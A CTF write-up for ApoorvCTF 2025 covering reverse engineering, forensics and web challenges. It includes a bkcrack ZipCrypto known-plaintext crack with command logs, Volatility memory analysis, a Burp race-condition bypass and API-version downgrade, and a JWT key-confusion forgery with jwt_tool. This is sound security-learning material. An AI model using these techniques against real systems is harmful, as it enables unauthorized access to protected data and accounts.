# ApoorvCTF 2025 Write-up

![image](https://github.com/user-attachments/assets/1b4394dc-61c3-4e75-aff8-95f88aaa39f0)

## RE - holy rice
An easy RE challenge with the main function look like this:

```C
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[200]; // [rsp+0h] [rbp-D0h] BYREF
  unsigned __int64 v5; // [rsp+C8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("Enter password: ");
  fgets(s, 200, stdin);
  s[strcspn(s, "\n")] = 0;
  sub_1199(s);                                  // mapping
  sub_12CB(s);                                  // do some kinda stuff
  sub_1418(s);                                  // reverse the string
  sub_14A6(s);                                  // do nothing
  if ( !strcmp(s, s2) )
    printf(aEnjoyTheRice);
  else
    printf(aNoRiceForYouBr);
  return 0LL;
}
```
I can see that the input will go through 4 functions to do sth with it, then it will be compared with the given string with is s2. So what I have to do it's just take the given string and reverse the logic that they encrypt.

Script:
```python
subs = "0123456789abcdefghijklmnopqrstuvwxyz_{}"
shift = 7
garbage_chars = "!@#$%^&*()"
xor_key = 0xFF

def reverse_transform(text):
    transformed = [ord(c) for c in text]
    not_bytes = [b ^ xor_key for b in transformed]
    flag_bytes = [~b & 0xFF for b in not_bytes]
    flag = ''.join(chr(b) for b in flag_bytes)
    
    flag = flag[::-1]
    
    clean = ""
    for i in range(0, len(flag)):
        if (i - 1) % 4 != 0:
            clean += flag[i]
            
    result = ""
    for c in clean:
        if c in subs:
            idx = subs.index(c)
            result += subs[(idx - shift) % len(subs)]
        else:
            result += c
            
    return result

if __name__ == "__main__":
    encrypted = "6!!sbn*ass%84z@84c(8o_^4#_#8b0)5m_&j}y$vvw!h"
    flag = reverse_transform(encrypted)
    print(flag)
```

## RE - rusty vault

> I am not really sure that my solution is the intended way to solve this challenge. But anyway, here is how I did it

I was given a file with is a ELF 64-bit from the language Rust. Put it to the IDA64 and I got the overview for the program with goes like:

![image](https://github.com/user-attachments/assets/d6a3b238-ad92-45b5-b5f7-b7ac51424ff5)

Looking through the Assembly for a while, I found out there are 3 check stage, which after the final one it will print out the flag like the comment said

![image](https://github.com/user-attachments/assets/04435e27-2d7e-49c9-92ca-41648c76db8a)


So what I think is that it may validate some data and give the flag if it's correct. But what happened if I patched all the conditions to get to this point? I tried it and it returned the flag in plaintext..


```terminal
-----Welcome to the Vault!-----
Enter the secret phrase:
anhcd
Stage 3 passed!!
The flag is: apoorvctf{P4tch_1t_L1k3_1t's_H0t}
```

## Forensics - Samurai's Code

An image file is provided, and analyzing it with the `strings` command reveals some unusual text at the end. This piece of tect is Brainfuck code.

Decoding the Brainfuck script using an online interpreter reveals a Google Drive link. Accessing the link leads to a single file named *samurai*, with no extension or other identifying details.

To determine the nature of the file, the `file` command is executed:

```bash
file samurai
```

The output simply states *data*, meaning the file type is not recognized.  Opening the file in a hex editor like `ghex` reveals the first few bytes as `D8 FF E0 FF`.

This closely resembles the standard JPEG header (`FF D8 FF E0`), except that each consecutive byte pair appears to be swapped.

Recognizing this byte-swapping pattern suggests that the original file structure can be restored by reversing the swaps. We can write a python script to swap every consecutive byte pair back into the correct order:

```python
def reverse_swap_concurrent_bytes(input_file, output_file):
    with open(input_file, "rb") as f:
        data = bytearray(f.read())

    for i in range(0, len(data) - 1, 2):
        data[i], data[i + 1] = data[i + 1], data[i]

    with open(output_file, "wb") as f:
        f.write(data)

reverse_swap_concurrent_bytes("samurai", "restored.jpg")
```

Executing the script:

```bash
python3 restore.py
```

This gives a new file, *restored.jpg*. Opening the file we can see the flag. 
**Flag: `apoorvctf{ByT3s_OUT_OF_ORd3R}`**

## Forensics: ramen-lockdown
This challenge is based on a typical type of For challs (ZipCrypto encryption) which can be found on the Internet: [here is one of them](https://mariuszbartosik.com/buckeye-ctf-2024-reduce_recycle-write-up/)

```terminal
./bkcrack.exe -C recipe.zip -c secret_recipe.png -x 0 89504E470D0A1A0A0000000D49484452


7cfefd6a 4aedd214 970c7187

./bkcrack.exe -C recipe.zip -k 7cfefd6a 4aedd214 970c7187 -D recip_no_passwd.zip


┌──(anhcd㉿MSI)-[/mnt/e/Apps-Tools/Apps/bkcrack-1.7.1-win64/bkcrack-1.7.1-win64]
└─$ ./bkcrack -L recipe.zip
-bash: ./bkcrack: No such file or directory

┌──(anhcd㉿MSI)-[/mnt/e/Apps-Tools/Apps/bkcrack-1.7.1-win64/bkcrack-1.7.1-win64]
└─$ ./bkcrack.exe -L recipe.zip
bkcrack 1.7.1 - 2024-12-21
Archive: recipe.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 ZipCrypto  Store       89119f09        89796        89808 secret_recipe.png

┌──(anhcd㉿MSI)-[/mnt/e/Apps-Tools/Apps/bkcrack-1.7.1-win64/bkcrack-1.7.1-win64]
└─$ ./bkcrack.exe -C recipe.zip -c 3.png -x 0 89504E470D0A1A0A0000000D49484452
bkcrack 1.7.1 - 2024-12-21
Zip error: found no entry named "3.png".

┌──(anhcd㉿MSI)-[/mnt/e/Apps-Tools/Apps/bkcrack-1.7.1-win64/bkcrack-1.7.1-win64]
└─$ ./bkcrack.exe -C recipe.zip -c secret_recipe.png -x 0 89504E470D0A1A0A0000000D49484452
bkcrack 1.7.1 - 2024-12-21
[22:35:14] Z reduction using 9 bytes of known plaintext
100.0 % (9 / 9)
[22:35:14] Attack on 721680 Z values at index 6
Keys: 7cfefd6a 4aedd214 970c7187
41.3 % (298072 / 721680)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 298072
[22:38:33] Keys
7cfefd6a 4aedd214 970c7187

┌──(anhcd㉿MSI)-[/mnt/e/Apps-Tools/Apps/bkcrack-1.7.1-win64/bkcrack-1.7.1-win64]
└─$ ./bkcrack.exe -C recipe.zip -k 7cfefd6a 4aedd214 970c7187 -D recip_no_passwd.zip
bkcrack 1.7.1 - 2024-12-21
[22:44:09] Writing decrypted archive recip_no_passwd.zip
100.0 % (1 / 1)
```
## [Forensics] Ramen lockdown
## Analysis
As the challenge description said, we have to crack the `recipe.zip` file. This file requires password for extracting files contained inside it

Normally, compressed files use AES-256 encryption. Therefore, it is very difficult to brute-force passwords.
However, we can directly view the file inside by using 7-Zip. There's a file named `secret_recipe.png`

## Solution

Still using 7-Zip, we know the encryption method is not AES-256! It's ZipCrypto
![image](https://github.com/user-attachments/assets/7468909f-21a8-4606-9c89-d7dd1d931b55)

Nice, we gonna use [bkcrack](https://github.com/kimci86/bkcrack) to extract the `secret_recipe.png` image

To break ZipCrypto, `bkcrack` requires 12 bytes of known plaintext. PNG files start with the following hex header: `89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`

I used this command (finished in ~3 minutes)

`bkcrack -C recipe.zip -c secret_recipe.png -x 0 89504E470D0A1A0A0000000D49484452`

And got the key

`7cfefd6a 4aedd214 970c7187`

Now, we can decrypt the archive and save it as an unencrypted version

`bkcrack -C recipe.zip -k 7cfefd6a 4aedd214 970c7187 -D recipe_decrypted.zip`

Opened the image inside `recipe_decrypted.zip`, and I got ...

# Flag: `apoorvctf{w0rst_r4m3n_3v3r_ong}`

# Here are some of the challenges that I was not able to do, just want to note it out

## Forensics - Whispers of the Forgotten
> **The volatility one**

We've been provided with a `.mem` file. To determine what kind of file it is, we use the `file` command:  

```
file memdump.mem 
memdump.mem: Windows Event Trace Log
```


This identifies the file as a **Windows Event Trace Log**. Windows Event Tracing is a logging mechanism that captures system and application activity, which can be useful for diagnosing issues, monitoring security events, or performing forensic analysis.  

For further investigation, we use **Volatility**, an open-source memory forensics framework that allows us to analyze memory dumps without modifying the original data. It supports various plugins that help uncover important forensic artifacts such as running processes, network connections, and user activity.  

Before diving into specific artifacts, we need to determine the system profile using `imageinfo`. This helps us identify the OS version and the appropriate Volatility profile for further analysis.  

```
python2 vol.py -f memdump.mem imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win10x64_19041
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (memdump.mem)
                      PAE type : No PAE
                           DTB : 0x1aa000L
                          KDBG : 0xf8035fa12b20L
          Number of Processors : 4
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff8035e8ce000L
                KPCR for CPU 1 : 0xffffbf81ed9e0000L
                KPCR for CPU 2 : 0xffffbf81ed3e4000L
                KPCR for CPU 3 : 0xffffbf81ed762000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2025-02-06 16:30:39 UTC+0000
     Image local date and time : 2025-02-06 16:30:39 +0000

```


This command provides a list of possible OS profiles. This suggests that we need to use Win10x64_19041 as our profile

Once we have the correct profile, we list the processes that were active when the memory dump was taken:  

```
python2 vol.py -f memdump.mem --profile=Win10x64_19041 pslist
Volatility Foundation Volatility Framework 2.6.1
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0xffffd50f09e67040 System                    4      0    165        0 ------      0 2025-02-06 21:58:06 UTC+0000                                 
0xffffd50f09fcf040 Registry                108      4      4        0 ------      0 2025-02-06 21:58:00 UTC+0000                                 
0xffffd50f0a702080 smss.exe                376      4      2        0 ------      0 2025-02-06 21:58:06 UTC+0000                                 
0xffffd50f0a93e080 csrss.exe               492    472     11        0      0      0 2025-02-06 21:58:07 UTC+0000                                 
0xffffd50f0cf8f080 wininit.exe             568    472      1        0      0      0 2025-02-06 21:58:07 UTC+0000                                 
0xffffd50f0cfba140 csrss.exe               576    560     12        0      1      0 2025-02-06 21:58:07 UTC+0000                                 
.
.
.                                 
0xffffd50f10a282c0 svchost.exe            1376    712      4        0      0      0 2025-02-06 21:58:09 UTC+0000                                 
.
.                                
0xffffd50f1130e080 chrome.exe             3436   2356     44        0      1      0 2025-02-06 16:28:57 UTC+0000                                 
0xffffd50f10ed6080 chrome.exe             3572   3436      8        0      1      0 2025-02-06 16:28:57 UTC+0000                                 
0xffffd50f117af300 chrome.exe             2928   3436     19        0      1      0 2025-02-06 16:28:59 UTC+0000                                 
0xffffd50f1165c2c0 chrome.exe             4696   3436     20        0      1      0 2025-02-06 16:28:59 UTC+0000                                 
0xffffd50f106d70c0 chrome.exe             4808   3436      8        0      1      0 2025-02-06 16:29:00 UTC+0000                                 
0xffffd50f1220c080 chrome.exe             6636   3436      8        0      1      0 2025-02-06 16:29:09 UTC+0000                                 
0xffffd50f126ba080 chrome.exe             6644   3436     15        0      1      0 2025-02-06 16:29:09 UTC+0000                                 
0xffffd50f125ab080 dllhost.exe            7148    836     15        0      1      0 2025-02-06 16:29:45 UTC+0000                                 
0xffffd50f0c742080 FTK Imager.exe         6328   2356     25        0      1      0 2025-02-06 16:29:57 UTC+0000                                 
0xffffd50f1094b340 svchost.exe            6604    712     14        0      0      0 2025-02-06 16:30:14 UTC+0000                                 
0xffffd50f11c46080 sppsvc.exe             6832    712      9        0      0      0 2025-02-06 16:30:16 UTC+0000                                 
0xffffd50f11c4d080 svchost.exe            2864    712     15        0      0      0 2025-02-06 16:30:17 UTC+0000                                 

```

This helps us identify any suspicious or unusual processes that may indicate malware or unauthorized activity. Looking at the process list, we notice that `Chrome is running`, suggesting that the user was actively using the browser at the time the memory snapshot was taken.  


Since Chrome was in use, we can leverage the `chromehistory` plugin in Volatility to extract browsing activity stored in memory:

```
python2 vol.py -f memdump.mem --profile=Win10x64_19041 chromehistory
Volatility Foundation Volatility Framework 2.6.1
Index  URL                                                                              Title                                                                            Visits Typed Last Visit Time            Hidden Favicon ID
------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- ------ ----- -------------------------- ------ ----------
     3 https://www.google.com/                                                          Google                                                                               14     0 2025-02-06 16:29:10.880236        N/A       
    21 https://thehackernews.com/                                                       The Hacker News | #1 Trusted Cybersecurity News Site                                  2     0 2025-02-06 12:09:26.717240        N/A       
     2 https://google.com/                                                              Google                                                                                7     7 2025-02-06 16:29:10.438357        N/A       
    27 https://workspace.google.com/intl/en-US/gmail/                                   Gmail: Private and secure email at no cost | Google Workspace                         2     0 2025-02-02 04:33:01.423161        N/A       
    26 https://accounts.google.com/ServiceLogi...ttps://mail.google.com/mail/u/0/&emr=1 Gmail: Private and secure email at no cost | Google Workspace                         2     0 2025-02-02 04:33:01.423161        N/A       
    .
    .
    .
       107 https://pastebin.com/zk0wH7Pj                                                    Junk - Pastebin.com                                                                   1     1 2025-02-04 17:00:41.665556        N/A       
   106 https://www.google.com/search?q=this+is...5IHBDcuMTGgB5HtAQ&sclient=gws-wiz-serp this is the flag YXBvb3J2Y3Rme2Y0a2VfRjFhZyEhIX0= - Google Search                     3     0 2025-02-04 16:59:50.592017        N/A       
   139 https://www.youtube.com/watch?v=g2fT-g9PX9o                                      Network Ports Explained - YouTube                                                     1     0 2025-02-06 16:23:32.390565        N/A       
    .
    .
    .
```

This retrieves details such as **visited URLs, page titles, access timestamps, and search queries**, which can help track user activity.
  

Among the extracted URLs, we notice a `Pastebin link` with the title `"Junk"` Visiting this Pastebin reveals the flag, completing our investigation.  

**Flag: `apoorvctf{ur1s_n3v3r_1i3}`**

## Web2 - Blog 1

First when I visited the url, there was a login form. It seems like it will be some kind of application here with functionalities.

In these situations, I just use the app normally to get a bird's eye view of the application. Burp is working in the background to save our history for us later.

Also another useful thing is writing possible attack vectors and ideas when exploring the application.

For example here we have a login page, so I thought that I might need to access an admin account, it may have sql injection? Maybe not because this is a NextJS app ans probably immune to it. (You can use an extesion like Wappalyzer to know the technologies used in the app)

I registered and logged in, and there was my blog posts page

![image](https://github.com/user-attachments/assets/e1c59c0b-533f-455d-b399-52f99368ec08)

We can add a new post, and we have a Daily Rewards button.

![image](https://github.com/user-attachments/assets/c16f6c9c-ebf5-47cf-a49f-a15a7b6831a1)

I can get a daily reward if I wrote 5 posts, let's try that.

I added the first post with no problem, but in the second post I got this warning: Only one blog per day is allowed!

There was also comments functionality, can it has somehting to do with XSS to steal a cookie? this feature didn't work though, I got an error whenever I add a comment

This was very much it from the UI, now let's move to Burp for a deeper look.

![image](https://github.com/user-attachments/assets/593bdcd1-38ba-4969-b0a9-88507efc192f)

From the first look on history,we can see API versions: /api/v1 and /api/v2. It might be a versioning issue. An old version might leak something.

In the requests them selves they had Authorization with jwt token, so it might be a JWT-related challenge. (Notice I am writing down all my thoughts and ideas)

I checked the requests and came across this one:

![image](https://github.com/user-attachments/assets/fad33eaa-61f5-490b-b1a6-069ff4d1eee5)

In adding blog request, it passes a date in the body, I tried to change it to the next day to see if I can bypass the daily limit. But it didn't work.

In these kind of functionalities that has a limit, you can try Race Condition.

So far we have some notes and ideas to try:
* Is it an admin account takeover?
* Is there an SQL injection?
* Is there an XSS in comments?
* Is it a JWT-related challenge?
* Is there an API versioning issue?
* Is there a Race Condition?

Now go through them and try different techniques. I went with the race condition one at first becuase I suspected this Daily Rewards functionality. That if I can bypass the limit, I can get the flag.

I made a new account and sent a request to add a post. Intercepted the request in burp before it goes to the server potentially exploit it via Race Condition.

We can implement Race Condition in many ways, but I used Burp's tab group feature.

First make 5 copies of the request, then click on the + -> Crete tab group

![image](https://github.com/user-attachments/assets/3e42f16b-8519-40a4-8643-77268813795d)

Choose all 5 requests and click create

Now next to Send button, click on the down arrow and choose the last option: Send group in parallel. Now send.

When we get the response we notice 201 Created in all responses which indicates success. Back to the website, click on Daily Rewards, we get a youtube link.

It's a joke from the author 🙂. Frankly.. it was unexpected 😆, It's like he Rickrolled you but Skibidi Toilet version 😂😂

Back to the Daily Rewards request, we notice its endpoint is /api/v2/gift. Change it to /api/v1/gift (The old version) and we got the flag!

apoorvctf{s1gm@_s1gm@_b0y}

We got lucky there that the first technique we tried worked. But if it didn't, you have the notes you wrote, play around with them until you figure it out.

## Web3 - Tanjero
This is a easy JWT algorighm confusion attack which can be exploit by:

```
┌──(anhcd㉿MSI)-[/mnt/e/Web Pentest/JWT]
└─$ python3 jwt_tool.py --exploit k -pk key.txt eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJHdWVzdCIsImlhdCI6MTc0MDkwMDE1OH0.IqU5koM-VsyFHl-T2JSd-lwjx9rgfznmUdLyq-NenRruG0UnSQHgUOh9-W8fyXsv3SuMsbCoaM5tkSGA8M6Pea-tHFT7jrJJBTsmCM3AM0eGkZ2kWbQWZ2NvO4jL2iou538t5xCgYXFL57KBVt-7k_iVw3JaZUNoI6q5dTgq4PT9vOn6aUoh3rEpxGIcR5qcJRwXDwA9Fg_Qem3w5FH3-cKrtDxlMdDKD9fc4dXVnJgIc9AhjU12khbhdHnO1yXMW1NGM21c1o1Ws4NawdGK5k-xI8BoiCIWSZ5l50r7dZvEMwEVRAQ2nbXeXKy1kcz5agAE-y55xXDZeG5YIgFupQ

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

File loaded: key.txt
jwttool_808a8dcec18b1ed146cfdf74e4b0e430 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJHdWVzdCIsImlhdCI6MTc0MDkwMDE1OH0.ffRm10fLPVCBmFIbjFtMTgsicr-82TXtSW4slH8Md8E
```
